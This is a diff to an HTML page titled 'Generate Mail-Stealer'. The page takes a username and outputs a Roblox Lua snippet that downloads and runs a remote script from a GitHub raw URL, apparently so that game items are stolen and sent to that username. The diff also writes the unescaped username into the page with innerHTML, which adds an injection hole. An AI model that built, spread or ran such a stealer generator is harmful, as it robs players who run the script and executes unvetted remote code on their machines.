@@ -3,17 +3,19 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Simple Site</title>
+<title>Coen On Top</title>
 <style>
   body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px; }
   .container { background-color: white; padding: 20px; border-radius: 8px; display: inline-block; }
   .input-field, .checkbox-group, button { margin: 10px 0; }
   button { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
   button:hover { background-color: #0056b3; }
+  #output { text-align: left; }
 </style>
 </head>
 <body>
   <div class="container">
+  <h1>Generate Mail-Stealer</h1>
     <div class="input-field">
       <label for="username">Username:</label>
       <input type="text" id="username" name="username">
@@ -27,7 +29,7 @@
       <label for="farmui">Farmui</label>
     </div>
     <button onclick="generateOutput()">Generate</button>
-    <p id="output"></p>
+    <pre id="output"></pre>
   </div>
 
   <script>
@@ -35,11 +37,11 @@
       var username = document.getElementById("username").value;
       var loadingscreen = document.getElementById("loadingscreen").checked;
       var farmui = document.getElementById("farmui").checked;
-      var outputString = 'Username = "' + username + '"\\n' +
-                         'loadingscreen = ' + loadingscreen + ' \\n' +
-                         'farmui = ' + farmui + '\\n' +
+      var outputString = 'Username = "' + username + '"<br>' +
+                         'loadingscreen = ' + loadingscreen + ' <br>' +
+                         'farmui = ' + farmui + '<br>' +
                          'loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()';
-      document.getElementById("output").innerText = outputString;
+      document.getElementById("output").innerHTML = outputString;
     }
   </script>
 </body>
